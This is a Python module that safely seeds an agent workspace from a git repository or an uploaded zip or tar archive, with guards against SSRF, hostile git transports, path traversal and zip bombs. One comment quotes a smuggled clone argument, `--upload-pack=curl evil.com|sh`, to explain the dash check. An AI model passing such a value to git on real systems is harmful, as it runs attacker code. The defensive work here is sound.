"""Seeding a run workspace from an existing codebase.

Two scenarios use this platform. A greenfield run starts from nothing and the
agents create the code; that needs no seeding and stays the default. A brownfield
run adds features to something that already exists, and the agents have to read
that code before they can extend it.

The workspace is a real directory on a real filesystem, and that is deliberate:
agents run ``ls``, ``cat``, ``git``, ``npm install`` and ``pytest``. Object
storage cannot back a working tree - no directories, no atomic rename, no
locking, a network round trip per read - so a codebase arrives here by being
*materialised into* the workspace, from one of two sources:

``git``
    Clone a repository. Preferred: it gives the agents history and diffs,
    ``build_repository_context`` reports a real branch and commit instead of
    ``"unknown"``, and the run has a reproducible base to produce a branch
    against.

``archive``
    Extract an uploaded zip or tarball, for a codebase with no reachable remote.

Both are untrusted input pointed at a directory the agents can execute in, so
this module is written defensively; each guard below notes what it stops.
"""

from __future__ import annotations

import ipaddress
import logging
import os
import shutil
import socket
import stat
import subprocess
import tarfile
import tempfile
import zipfile
from dataclasses import dataclass
from pathlib import Path
from urllib.parse import urlparse, urlunparse

logger = logging.getLogger(__name__)


class SeedError(ValueError):
    """A workspace could not be seeded from the requested source."""


# --------------------------------------------------------------------------
# Limits
# --------------------------------------------------------------------------

CLONE_TIMEOUT_SECONDS = int(os.environ.get("SEED_CLONE_TIMEOUT", "300"))

MAX_SEED_BYTES = int(os.environ.get("SEED_MAX_BYTES", str(2 * 1024 * 1024 * 1024)))
"""Ceiling on a materialised codebase. The workspace volume is shared by every
concurrent run, so one enormous repository must not be able to fill it."""

MAX_ARCHIVE_MEMBERS = int(os.environ.get("SEED_MAX_ARCHIVE_MEMBERS", "50000"))
"""Ceiling on entries in an archive. A zip bomb is small on disk and enormous
once expanded, and the member count is the cheapest thing to check first."""

ARCHIVE_SUFFIXES = (".zip", ".tar", ".tar.gz", ".tgz", ".tar.bz2", ".tbz2", ".tar.xz")

CHUNK_SIZE = 64 * 1024
"""Copy buffer for streaming an archive member to disk."""


# --------------------------------------------------------------------------
# Git URL validation
# --------------------------------------------------------------------------

_DEFAULT_ALLOWED_SCHEMES = frozenset({"https"})


def _allowed_schemes() -> frozenset[str]:
    """Transports a clone URL may use.

    HTTPS only by default. Every other git transport is a liability rather than
    a feature here:

    ``ext::``   runs an arbitrary shell command as the transport - remote code
                execution written into a URL.
    ``file://`` and bare local paths clone from the host filesystem, which turns
                "seed my workspace" into "copy any directory the server can read
                into a place the agents can read".
    ``ssh://``  needs a key on the server, so it authenticates as the *server*
                rather than as the requesting user.

    ``SEED_ALLOWED_SCHEMES`` can widen this for an operator who has decided one
    of those is acceptable in their deployment.
    """
    configured = os.environ.get("SEED_ALLOWED_SCHEMES", "").strip()
    if not configured:
        return _DEFAULT_ALLOWED_SCHEMES
    return frozenset(s.strip().lower() for s in configured.split(",") if s.strip())


def _private_hosts_allowed() -> bool:
    """Whether a clone may target a private, loopback or link-local address.

    Off by default. The server can reach things the caller cannot: other
    containers on the compose network, ``127.0.0.1:8000`` (this very API), and
    on a cloud host ``169.254.169.254``, whose metadata service hands out
    credentials to anyone who asks. A URL is the classic way to reach them.

    Operators running an internal git server set ``SEED_ALLOW_PRIVATE_HOSTS``.
    """
    return os.environ.get("SEED_ALLOW_PRIVATE_HOSTS", "false").strip().lower() in {
        "1", "true", "yes", "on",
    }


def _resolves_to_private_address(hostname: str) -> bool:
    """Whether any address this hostname resolves to is not publicly routable."""
    try:
        infos = socket.getaddrinfo(hostname, None)
    except socket.gaierror:
        # Unresolvable is not "private"; let git fail with a clearer message.
        return False

    for info in infos:
        address = info[4][0]
        try:
            parsed = ipaddress.ip_address(address)
        except ValueError:
            continue
        if (
            parsed.is_private
            or parsed.is_loopback
            or parsed.is_link_local
            or parsed.is_reserved
            or parsed.is_multicast
            or parsed.is_unspecified
        ):
            return True
    return False


def validate_git_url(url: str) -> str:
    """Return the URL if it is safe to hand to ``git clone``, or raise."""
    candidate = (url or "").strip()
    if not candidate:
        raise SeedError("A repository URL is required.")

    # git treats a leading '-' as an option, so a "URL" like
    # `--upload-pack=curl evil.com|sh` becomes an argument rather than a target.
    # argv execution stops the shell half of that; this stops the option half.
    if candidate.startswith("-"):
        raise SeedError("A repository URL may not begin with '-'.")

    if any(c in candidate for c in "\n\r\x00"):
        raise SeedError("A repository URL may not contain control characters.")

    parsed = urlparse(candidate)
    scheme = parsed.scheme.lower()
    if not scheme:
        raise SeedError(
            "A repository URL must include a scheme, e.g. https://github.com/owner/repo.git"
        )

    permitted = _allowed_schemes()
    if scheme not in permitted:
        raise SeedError(
            f"The '{scheme}' transport is not allowed. Permitted: {', '.join(sorted(permitted))}."
        )

    # `file://` addresses a path, not a host. Every network transport needs one,
    # and a hostless network URL is usually a malformed path that git would
    # resolve locally.
    if scheme != "file" and not parsed.hostname:
        raise SeedError("A repository URL must include a host.")

    if (
        parsed.hostname
        and not _private_hosts_allowed()
        and _resolves_to_private_address(parsed.hostname)
    ):
        raise SeedError(
            f"'{parsed.hostname}' resolves to a private or loopback address. "
            "Set SEED_ALLOW_PRIVATE_HOSTS to clone from an internal host."
        )

    # A password in a URL is always a credential, and it ends up in argv, in the
    # reflog, and in any log line that echoes the source. Tokens travel via
    # `token=` instead, which reaches git through GIT_ASKPASS.
    if parsed.password:
        raise SeedError(
            "Do not put credentials in the URL. Supply an access token separately "
            "so it is not written to logs or the run record."
        )
    # Over HTTP(S) a bare username is the token-smuggling form
    # (`https://ghp_xxx@github.com/...`). Over SSH it is the login name, which
    # is conventionally `git` and carries no secret.
    if parsed.username and scheme in {"http", "https"}:
        raise SeedError(
            "Do not put credentials in the URL. Supply an access token separately "
            "so it is not written to logs or the run record."
        )
    return candidate


def validate_git_ref(ref: str | None) -> str | None:
    """Return a branch or tag name safe to pass as ``--branch``, or raise."""
    if ref is None or not ref.strip():
        return None
    candidate = ref.strip()
    if candidate.startswith("-"):
        raise SeedError("A branch or tag name may not begin with '-'.")
    # Conservative: git's own refname rules, minus anything with a shell or
    # path meaning. This is a branch or tag, never a pathspec or an option.
    if any(c in candidate for c in " ~^:?*[\\\n\r\x00") or ".." in candidate:
        raise SeedError(f"'{candidate}' is not a valid branch or tag name.")
    return candidate


def redact_url(url: str) -> str:
    """A URL safe to log: host and path only, never userinfo or query."""
    try:
        parsed = urlparse(url)
    except ValueError:
        return "<unparseable url>"
    host = parsed.hostname or ""
    if parsed.port:
        host = f"{host}:{parsed.port}"
    return urlunparse((parsed.scheme, host, parsed.path, "", "", ""))


# --------------------------------------------------------------------------
# Size accounting
# --------------------------------------------------------------------------


def directory_size(path: Path) -> int:
    """Total size of regular files under `path`, not following symlinks."""
    total = 0
    for entry in path.rglob("*"):
        try:
            if entry.is_file() and not entry.is_symlink():
                total += entry.stat().st_size
        except OSError:
            continue
    return total


def _enforce_size(path: Path, source: str) -> None:
    size = directory_size(path)
    if size > MAX_SEED_BYTES:
        raise SeedError(
            f"{source} expands to {size:,} bytes, over the {MAX_SEED_BYTES:,} byte limit."
        )


# --------------------------------------------------------------------------
# Git
# --------------------------------------------------------------------------


def _clone_environment(token: str | None, askpass: Path | None) -> dict[str, str]:
    env = dict(os.environ)
    # Without this a private repository makes git block on a credential prompt
    # until the timeout, instead of failing immediately with a useful message.
    env["GIT_TERMINAL_PROMPT"] = "0"
    env.pop("GIT_ASKPASS", None)
    env.pop("SSH_ASKPASS", None)
    if token and askpass:
        # The token reaches git through a helper script rather than argv, so it
        # is not visible in `ps`, in a crash dump, or in a logged command line.
        env["GIT_ASKPASS"] = str(askpass)
        env["SEED_GIT_TOKEN"] = token
    return env


def _write_askpass(directory: Path) -> Path:
    script = directory / "askpass.sh"
    script.write_text('#!/bin/sh\nprintf "%s" "$SEED_GIT_TOKEN"\n', encoding="utf-8")
    script.chmod(stat.S_IRWXU)  # 0700: readable only by the server process
    return script


def seed_from_git(
    workspace: Path,
    url: str,
    *,
    ref: str | None = None,
    token: str | None = None,
    depth: int = 1,
) -> dict[str, str]:
    """Clone `url` into `workspace`. Returns a provenance record.

    The clone is shallow by default: the agents need the code, and full history
    on a large repository is a slow download that mostly fills the disk.
    """
    safe_url = validate_git_url(url)
    safe_ref = validate_git_ref(ref)

    workspace = Path(workspace).resolve()
    if any(workspace.iterdir()):
        raise SeedError("Refusing to seed a workspace that already has content in it.")

    with tempfile.TemporaryDirectory(prefix="seed-") as scratch:
        scratch_path = Path(scratch)
        askpass = _write_askpass(scratch_path) if token else None
        target = scratch_path / "repo"

        # `ext` is never legitimate here: it executes its argument as the
        # transport. `file` follows the scheme allowlist - hardcoding it to
        # `never` contradicted an operator who had explicitly enabled it, and
        # git refused a clone this module had already approved.
        file_policy = "always" if "file" in _allowed_schemes() else "never"

        command = [
            "git",
            # Belt and braces alongside the scheme allowlist: a redirect or a
            # submodule cannot reach a transport the caller was not granted.
            "-c", "protocol.ext.allow=never",
            "-c", f"protocol.file.allow={file_policy}",
            "-c", "credential.helper=",
            "clone",
            "--single-branch",
            # A submodule is another URL from another party, fetched with the
            # same credentials. Seeding does not recurse into them.
            "--no-recurse-submodules",
        ]
        if depth > 0:
            command += ["--depth", str(depth)]
        if safe_ref:
            command += ["--branch", safe_ref]
        command += ["--", safe_url, str(target)]

        logger.info("Cloning %s into a run workspace", redact_url(safe_url))
        try:
            result = subprocess.run(  # noqa: S603 - argv list, no shell
                command,
                capture_output=True,
                text=True,
                timeout=CLONE_TIMEOUT_SECONDS,
                env=_clone_environment(token, askpass),
                check=False,
            )
        except subprocess.TimeoutExpired:
            raise SeedError(
                f"Cloning timed out after {CLONE_TIMEOUT_SECONDS} seconds."
            ) from None
        except OSError as exc:
            raise SeedError(f"Could not run git: {exc}") from exc

        if result.returncode != 0:
            raise SeedError(f"Clone failed: {_clean_git_error(result.stderr, token)}")

        _enforce_size(target, "The repository")
        _move_contents(target, workspace)

    branch = _git_value(workspace, ["rev-parse", "--abbrev-ref", "HEAD"])
    commit = _git_value(workspace, ["rev-parse", "HEAD"])
    return {
        "type": "git",
        "url": redact_url(safe_url),
        "ref": safe_ref or branch or "",
        "commit": commit or "",
    }


def _clean_git_error(stderr: str, token: str | None) -> str:
    """git's stderr, trimmed and with any echoed token removed."""
    message = (stderr or "").strip()
    if token:
        message = message.replace(token, "***")
    lines = [line for line in message.splitlines() if line.strip()]
    return " ".join(lines[-3:])[:300] or "no output from git"


def _git_value(repo: Path, args: list[str]) -> str:
    try:
        result = subprocess.run(  # noqa: S603 - argv list, no shell
            ["git", *args], cwd=repo, capture_output=True, text=True, errors="replace", timeout=15, check=False
        )
    except (OSError, subprocess.TimeoutExpired):
        return ""
    return result.stdout.strip() if result.returncode == 0 else ""


# --------------------------------------------------------------------------
# Archives
# --------------------------------------------------------------------------


def _is_within(root: Path, candidate: Path) -> bool:
    return root == candidate or root in candidate.parents


def _check_archive_name(name: str) -> None:
    """Reject a member whose name would write outside the extraction root."""
    if name.startswith("/") or name.startswith("\\"):
        raise SeedError(f"Archive contains an absolute path: {name}")
    parts = Path(name).parts
    if ".." in parts:
        raise SeedError(f"Archive contains a traversal path: {name}")
    if len(name) > 1 and name[1] == ":":
        raise SeedError(f"Archive contains a drive-qualified path: {name}")


def _extract_zip(archive: Path, destination: Path) -> None:
    with zipfile.ZipFile(archive) as zf:
        members = zf.infolist()
        if len(members) > MAX_ARCHIVE_MEMBERS:
            raise SeedError(
                f"Archive has {len(members):,} entries, over the "
                f"{MAX_ARCHIVE_MEMBERS:,} limit."
            )

        total = 0
        for member in members:
            _check_archive_name(member.filename)
            total += member.file_size
            # Checked from the header before extracting anything, so a zip bomb
            # is refused rather than written to disk and measured afterwards.
            if total > MAX_SEED_BYTES:
                raise SeedError(
                    f"Archive expands to over {MAX_SEED_BYTES:,} bytes."
                )
            # The upper mode bits carry the unix file type. A symlink member
            # pointing at "/" lets a *later* member be written through it,
            # outside the workspace entirely.
            if stat.S_ISLNK(member.external_attr >> 16):
                raise SeedError(f"Archive contains a symlink: {member.filename}")

        # Extracted one member at a time rather than with `extractall`, so the
        # destination of every write is resolved and checked immediately before
        # that write. `extractall` picks those paths itself, which would leave
        # the containment argument resting entirely on the name checks above;
        # here it rests on the resolved path, which is what actually gets
        # written to.
        for member in members:
            target = (destination / member.filename).resolve()
            if not _is_within(destination, target):
                raise SeedError(f"Archive member escapes the workspace: {member.filename}")
            if member.is_dir():
                target.mkdir(parents=True, exist_ok=True)
                continue
            target.parent.mkdir(parents=True, exist_ok=True)
            # Re-check after creating the parent: if any component of it was a
            # symlink planted by an earlier member, the resolved path moves.
            if not _is_within(destination, target.parent.resolve()):
                raise SeedError(f"Archive member escapes the workspace: {member.filename}")
            with zf.open(member) as source, target.open("wb") as sink:
                shutil.copyfileobj(source, sink, CHUNK_SIZE)


def _extract_tar(archive: Path, destination: Path) -> None:
    with tarfile.open(archive) as tf:
        members = tf.getmembers()
        if len(members) > MAX_ARCHIVE_MEMBERS:
            raise SeedError(
                f"Archive has {len(members):,} entries, over the "
                f"{MAX_ARCHIVE_MEMBERS:,} limit."
            )

        total = 0
        for member in members:
            _check_archive_name(member.name)
            total += member.size
            if total > MAX_SEED_BYTES:
                raise SeedError(f"Archive expands to over {MAX_SEED_BYTES:,} bytes.")
            if member.issym() or member.islnk():
                raise SeedError(f"Archive contains a link: {member.name}")
            if member.isdev() or member.ischr() or member.isblk() or member.isfifo():
                raise SeedError(f"Archive contains a special file: {member.name}")

        # `filter="data"` is tarfile's own hardening (Python 3.12+): it strips
        # setuid bits and absolute paths and refuses links that escape. The
        # checks above are not redundant with it - they produce a message that
        # names the offending member.
        tf.extractall(destination, filter="data")  # noqa: S202


def seed_from_archive(workspace: Path, archive_path: str | Path) -> dict[str, str]:
    """Extract an uploaded archive into `workspace`. Returns a provenance record."""
    archive = Path(archive_path)
    if not archive.is_file():
        raise SeedError(f"Archive not found: {archive.name}")

    suffix = "".join(archive.suffixes[-2:]).lower()
    if not any(str(archive).lower().endswith(known) for known in ARCHIVE_SUFFIXES):
        raise SeedError(
            f"'{archive.name}' is not a supported archive. "
            f"Supported: {', '.join(ARCHIVE_SUFFIXES)}."
        )

    workspace = Path(workspace).resolve()
    if any(workspace.iterdir()):
        raise SeedError("Refusing to seed a workspace that already has content in it.")

    with tempfile.TemporaryDirectory(prefix="seed-") as scratch:
        staging = Path(scratch) / "extracted"
        staging.mkdir()

        try:
            if zipfile.is_zipfile(archive):
                _extract_zip(archive, staging)
            elif tarfile.is_tarfile(archive):
                _extract_tar(archive, staging)
            else:
                raise SeedError(f"'{archive.name}' is not a readable zip or tar archive.")
        except (zipfile.BadZipFile, tarfile.TarError) as exc:
            raise SeedError(f"Could not read '{archive.name}': {exc}") from exc

        _enforce_size(staging, "The archive")
        _move_contents(_flatten_single_root(staging), workspace)

    return {"type": "archive", "archive": archive.name, "format": suffix or archive.suffix}


def _flatten_single_root(extracted: Path) -> Path:
    """Return the real content root of an extraction.

    Archives are conventionally made with one top-level directory, so extracting
    ``project.zip`` gives ``project/src/...``. Left alone the workspace root
    would hold a single folder, and every path the agents were told about would
    be off by one segment.
    """
    entries = [e for e in extracted.iterdir() if e.name not in {"__MACOSX"}]
    if len(entries) == 1 and entries[0].is_dir():
        return entries[0]
    return extracted


def _move_contents(source: Path, destination: Path) -> None:
    """Move everything inside `source` into `destination`."""
    for entry in source.iterdir():
        shutil.move(str(entry), str(destination / entry.name))


# --------------------------------------------------------------------------
# Entry point
# --------------------------------------------------------------------------


@dataclass(frozen=True)
class SeedResult:
    """What a workspace was seeded from, for the run record and the audit log."""

    seeded: bool
    provenance: dict[str, str]


def seed_workspace(
    workspace: Path,
    source: object | None,
    *,
    resolve_upload,
    resolve_run=None,
) -> SeedResult:
    """Materialise `source` into `workspace`, if a source was requested.

    `resolve_upload` maps an upload id to a stored path. It is injected rather
    than imported so this module never decides which file a caller may reach.
    `resolve_run` does the same for a finished run's workspace (plan BW.2).
    """
    if source is None or getattr(source, "type", "empty") == "empty":
        return SeedResult(seeded=False, provenance={"type": "empty"})

    kind = getattr(source, "type")
    if kind == "git":
        result = SeedResult(
            seeded=True,
            provenance=seed_from_git(
                workspace,
                getattr(source, "url", ""),
                ref=getattr(source, "ref", None),
                token=getattr(source, "token", None),
                depth=getattr(source, "depth", 1) or 1,
            ),
        )
    elif kind == "archive":
        stored = resolve_upload(getattr(source, "upload_id", ""))
        if stored is None:
            raise SeedError("That upload could not be found.")
        result = SeedResult(seeded=True, provenance=seed_from_archive(workspace, stored))
    elif kind == "run":
        from app.server.change_request_runs import seed_from_run

        run_id = str(getattr(source, "run_id", "") or "")
        finished = resolve_run(run_id) if resolve_run is not None and run_id else None
        if finished is None:
            raise SeedError("That run could not be found, or it has not completed.")
        result = SeedResult(seeded=True, provenance=seed_from_run(workspace, Path(finished), run_id))
    else:
        result = None
    if result is not None:
        # The workflow reads it to hold the seeded product's own green tests (plan BW.1).
        from app.acceptance.regression_contract import mark_seeded

        mark_seeded(workspace, result.provenance)
        return result

    raise SeedError(f"Unknown workspace source '{kind}'.")


__all__ = [
    "ARCHIVE_SUFFIXES",
    "MAX_ARCHIVE_MEMBERS",
    "MAX_SEED_BYTES",
    "SeedError",
    "SeedResult",
    "directory_size",
    "redact_url",
    "seed_from_archive",
    "seed_from_git",
    "seed_workspace",
    "validate_git_ref",
    "validate_git_url",
]
